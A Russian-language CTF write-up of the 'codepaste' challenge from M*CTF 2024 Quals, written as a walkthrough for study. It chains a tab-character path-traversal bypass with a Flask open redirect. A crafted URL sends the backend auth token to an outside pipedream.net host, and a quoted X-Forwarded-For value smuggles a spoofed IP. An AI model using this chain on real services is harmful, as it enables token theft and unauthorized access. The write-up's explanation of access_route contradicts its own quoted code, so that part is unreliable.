---
title: "codepaste - M*CTF 2024 Quals"
category: "rev"
type: "writeup"
tags: ["rev", "flask", "redis", "nginx", "codepaste", "m-ctf-2024-quals", "2024", "ctf-writeup"]
summary: "Обзорно представляя таск, он сделан следующим образом."
source:
  name: "CTFtime writeup #39660"
  url: "https://ctftime.org/writeup/39660"
ctf:
  name: "M*CTF 2024 Quals"
  year: 2024
  challenge: "codepaste"
---

## Metadata

- **CTF:** M*CTF 2024 Quals
- **Task:** codepaste
- **Author team:** N0N@me13
- **CTFtime:** <https://ctftime.org/writeup/39660>

---
Обзорно представляя таск, он сделан следующим образом.  
![topology](<https://i.ibb.co/NCSBTv1/Pasted-image-20241117191144.png>)  
Согласно конфигурации nginx-а, он проксирует запросы сразу к 2 хостам.  
```  
server {  
listen 80;  
server_name _;  
location / {  
proxy_pass http://frontend:5002;  
}  
}  
server {  
listen 80;  
server_name api-backend.local;

location / {  
proxy_pass http://backend:5001;  
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  
}  
}  
```  
Сразу в глаза бросается, что бэкэнд, который по идее не должен быть закрыт для запросов снаружи, все же доступен.  
Сервис представляет собой редактор заметок. Цель таска - прочитать приватную заметку админа с флагом внутри.  
Отметим особенность работы сервиса. Фактический путь обработки действий пользователя будет следующим  
![](<https://i.ibb.co/379kXFB/Pasted-image-20241117191328.png>)  
С фронта запрос идет на бэкэнд, реализованный на node js, оттуда на api бэкэнд на фласке, способный работать с базой данных в лице redis.  
В связи с целью таска я подумал о том, что могу;  
1) Зарегистрироваться как админ - не могу все же  
2) Войти как админ - не могу  
3) Сделать запрос в бэку апишки чтобы получить содержимое заметки напрямую, без посредника в виде фронта и бэка на ноде.  
Сделать запрос сразу на api backend нельзя - есть проверка токена авторизации и ip адреса отправителя запроса.  
```  
...  
def check_ip():  
ip = request.access_route[-1]  
if not (FRONTEND_HOST in ip):  
return { "status": "error", "message": "invalid ip" }  
...  
def verify_token():  
token = request.headers.get("Token", "")  
if token != TOKEN:  
return { "status": "error", "message": "Invalid Token" }  
...  
```  
При обработке запроса бэкэндом № 1 видим, что данные можно заинжектить только 1 одно место. Фактически найти точку входа можно как минимум потому, что автор любезно оставил единственный отладочный вывод именно в этом месте.  
```  
async getUserInfo(username) {  
if (!checkPath(username)) return { status: "erorr", message: "invalid username" }

console.log(`${this.url}/user/${username}`)

const res = await got.get(`${this.url}/user/${username}`,  
{ headers: { Token: this.token } }).json()

return res  
}  
```  
Есть возможность влиять на url запроса к бэку 2 через username. Чтобы переписать user необходимо обойти функцию  
```  
const checkPath = (path) => decodeURI(path).indexOf('..') === -1  
```  
Следует знать, что в процессе работы с url они нормализуются. Фреймворк got, используемый в данном случае использует встроенный в js парсер url, который в свою очередь удаляет из пути спецсимволы в лице \t \n \r (crlf не работает).  
Таким образом при проверке url   
```  
checkPath: .\t. != ..

А при запросе   
got.get: .\t. -> ..  
```  
Таким образом с помощью url вида   
```  
<http://backend.com/api/user/.%09.%2fsmth>  
```  
Можно было добиться возможности перезаписи  
```  
<http://backend.com/can_rewrite_there>  
```  
Это не дает возможности перенаправить запрос себе и получить токен.  
Автор предусмотрительно добавляет в бэкэнд на python следующие строки  
```  
@app.before_request  
def hook():  
if request.path.startswith("/api"):  
return redirect(request.path[4:])  
```  
Данная функция может перенаправить запрос на указанный url если отправить запрос вида   
```  
<http://backend.com/api/redirect_to_me>  
```  
К счастью, сделать такой запрос от имени backend 1 мы можем.  
Сделав запрос:  
```  
Делаю запрос  
http://frontend/api/user/.%09.%2f.%09.%2fapi%2f%[2feo7f6cpw3t4lqq2.m.pipedream.net](http://2feo7f6cpw3t4lqq2.m.pipedream.net)

node js backend

username = .%09.%2f.%09.%2fapi%2f%[2feo7f6cpw3t4lqq2.m.pipedream.net](http://2feo7f6cpw3t4lqq2.m.pipedream.net)  
const res = await got.get(`${this.url}/user/${username}`,

http://backend/api//[eo7f6cpw3t4lqq2.m.pipedream.net](http://eo7f6cpw3t4lqq2.m.pipedream.net)

python backend  
return redirect(request.path[4:])  
  
request.path[4:] = //[eo7f6cpw3t4lqq2.m.pipedream.net](http://eo7f6cpw3t4lqq2.m.pipedream.net)  
redirect(//[eo7f6cpw3t4lqq2.m.pipedream.net](http://eo7f6cpw3t4lqq2.m.pipedream.net))  
```  
redirect в flask отправляет ответ с кодом 302 на запрос, выставляя Location: //[eo7f6cpw3t4lqq2.m.pipedream.net](http://eo7f6cpw3t4lqq2.m.pipedream.net) и браузер спокойно интерпретирует это как <http://eo7f6cpw3t4lqq2.m.pipedream.net>

Таким образом редирект на схеме можно представить как   
![](<https://i.ibb.co/hm2pj81/Pasted-image-20241117195913.png>)  
При редиректе выставленные заголовки сохраняются и токен авторизации получен.  
[](<https://i.ibb.co/5RWFcYJ/Pasted-image-20241117200023.png>)

Для того, чтобы работать с api backend необходимо подменить собственный ip адрес, обойдя обработку заголовка x-forwarded-for, выставляемого nginxом.

backend 2 обрабатывает ip получаемый от прокси следующим образом 

```  
def check_ip():  
ip = request.access_route[-1]  
if not (FRONTEND_HOST in ip):  
return { "status": "error", "message": "invalid ip" }  
```  
Изучив исходный код `access_route` видим следующее.  
```  
def parse_http_list(s):  
"""Parse lists as described by RFC 2068 Section 2.

In particular, parse comma-separated lists where the elements of  
the list may include quoted-strings. A quoted-string could  
contain a comma. A non-quoted string could have quotes in the  
middle. Neither commas nor quotes count if they are escaped.  
Only double-quotes count, not single-quotes.  
"""  
res = []  
part = ''

escape = quote = False  
for cur in s:  
if escape:  
part += cur  
escape = False  
continue  
if quote:  
if cur == '\\\':  
escape = True  
continue  
elif cur == '"':  
quote = False  
part += cur  
continue

if cur == ',':  
res.append(part)  
part = ''  
continue

if cur == '"':  
quote = True

part += cur

# append last part  
if part:  
res.append(part)

return [part.strip() for part in res]  
```  
В заголовке `X-Forwarded-For` могут писаться ip адреса разделенные запятой, но если в нем будут фрагменты явно обозначенные как строки с помощью " , то разделение по запятой произведено не будет  
```  
print(parse_http_list('127.0.0.1,3.3.3.3'))  
print(parse_http_list('"127.0.0.1,3.3.3.3"'))  
print(parse_http_list('127.0.0.1",3.3.3.3'))

['127.0.0.1', '3.3.3.3']  
['"127.0.0.1,3.3.3.3"']  
['127.0.0.1",3.3.3.3']  
```

Вернемся на шаг назад.  
Проверка ip адреса с помощью метода `access_route`   
```  
def check_ip():  
ip = request.access_route[-1]  
if not (FRONTEND_HOST in ip):  
return { "status": "error", "message": "invalid ip" }  
```  
Но функция `access_route` возвращает не массив, а строку  
```  
def access_route(self) -> list[str]:  
```  
Таким образом в общем виде проверка превращается из  
```  
if not ('a' in ['a','b','c']):  
или с использованием кавычки  
if not ('a' in ['a"bc]):  
```  
в проверку вида  
```  
if not ('a' in 'a"bc'):  
```  
И раз проверяется наличие подстроки, все срабатывает корректно.  
Таким образом угадываем ip адрес в подсети докера и получаем необходимую запись  
![](<https://i.ibb.co/5RX8V3N/Pasted-image-20241117212654.png>)
